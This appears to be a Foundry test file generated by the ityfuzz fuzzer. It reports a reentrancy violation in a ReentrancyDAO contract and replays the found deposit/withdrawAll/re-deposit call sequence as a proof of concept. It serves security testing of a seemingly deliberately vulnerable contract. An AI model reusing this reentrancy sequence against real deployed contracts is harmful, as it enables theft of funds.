// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -t './build/*' -f
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy on "build/ReentrancyDAO(0x887db5715868498cff494b5dcc8eda6ce5b7652a)" at slot 29836604556972703327658726810748771214999612883697159604690988773597119738218
================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.deposit{value: 4.6116 ether}()
   ├─[1] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.withdrawAll()
   │  ├─[2] [Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb.fallback()
   │  │  ├─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.deposit{value: 1688.1673 ether}()
   │  │  └─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call(0x00000000)


 */

contract Build is Test {
    function setUp() public {
    }

    function test() public {
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).deposit{value: 4.6116 ether}();
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).withdrawAll();
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).deposit{value: 1688.1673 ether}();
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function deposit() external payable;
    function withdrawAll() external payable;
}
